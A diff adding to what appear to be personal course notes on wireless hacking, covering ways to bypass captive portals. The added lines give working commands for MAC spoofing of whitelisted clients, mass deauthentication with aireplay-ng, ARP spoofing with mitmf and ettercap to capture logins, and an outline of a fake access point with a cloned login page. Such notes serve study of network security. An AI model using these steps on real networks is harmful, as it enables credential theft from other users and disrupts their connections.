@@ -260,9 +260,48 @@ So we'll be able to capture that name and we'll know the network name.
 There are a number of ways to bypass captive portals depending on the way it is 
 implemented:
 1. Change MAC address to one of a connected client.
+```
+1 Discover the conected witelisted clients
+airodump-ng --bssid (BSSID) --channel (Nº) mon0
+2. Change you mac to that witelisted mac (go Manage mode)
+ifconfig wlan0 down
+macchanger -m [Mac from Whitelist] wlan0
+ifconfig wlan0 up
+```
 2. Sniff logins in monitor mode.
+- Since captive portals are open.
+- IE: they do NOT use encryption;
+- We can sniff data sent to/from it using airodump-ng.
+- Then use Wireshark to read this data including passwords.
+```
+1 sniff data sent to/from it using airodump-ng
+airodump-ng --bssid (BSSID) --channel (Nº) --write airport mon0
+2. Deautentificate a conected client so he is force to login back
+aireplay-ng --deauth 10000000 -a (BSSID) -c (STATION) mon0
+3. Use Wireshark and look for http and post request to find the login and password
+```
 3. Connect and sniff logins after running an arp spoofing attack.
+- Since captive portals are open;
+- Therefore we can connect to the target without a password;
+- We can then run a normal arp spoofing attack;
+    - Clients will automatically lose their connection and will be asked to login again
+    - Data sent to/from router including passwords will be directed to us
+```
+1. Go to manage mode
+2. Conect to the network
+3. Do a MITM attak to arp spoof the entier network
+mitmf --arp --spoof -i wlan0 --gateway 192.168.1.1
+or
+ettercap -Tq -M arp:remote -i wlan0 ///
+4. The users will be asked to enter their login credentials again and you will cach them
+```
 4. Create a fake AP, ask users to login.
+- Clone the login page used by the captive portal.
+- Create a fake AP with the same/similar name.
+- Deauth users to use the fake network with the cloned page.
+- Sniff the login info!
+
+
 
 ## Conclucion:
 no usar wep  
